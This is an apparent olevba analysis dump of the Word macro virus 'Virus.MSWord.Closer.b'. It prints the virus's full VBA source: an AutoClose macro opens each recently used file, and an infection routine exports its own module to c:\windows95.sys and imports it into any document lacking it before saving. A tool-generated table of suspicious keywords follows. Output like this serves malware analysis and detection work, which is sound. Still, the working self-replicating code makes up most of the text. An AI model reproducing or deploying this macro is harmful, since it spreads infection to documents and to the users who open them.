olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Closer.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Closer.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO Closer.bas 
in file: Virus.MSWord.Closer.b - OLE stream: 'Macros/VBA/Closer'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
Application.WindowState = wdWindowStateMinimize
RecMax = RecentFiles.Maximum
For i = 1 To RecMax
RecentFiles(i).Open
Call InfectMyAss
DocName = RecentFiles(i).Name
'Documents(DocName).Close
Next
Application.Quit
End Sub
Sub InfectMyAss()
On Error Resume Next

Set ActDok = ActiveDocument.VBProject.VBComponents
ActMod = Application.VBE.SelectedVBComponent.Name
ActInf = False

ActDok(ActMod).Export "c:\windows95.sys"

For i = 1 To ActDok.Count
    If ActDok(i).Name = ActMod Then ActInf = True
Next

If ActInf = False Then
    ActDok.Import "c:\windows95.sys"
    ActiveDocument.SaveAs ActiveDocument.FullName
End If
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Open                |May open a file                              |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|IOC       |Application.VBE     |Executable file name                         |
+----------+--------------------+---------------------------------------------+

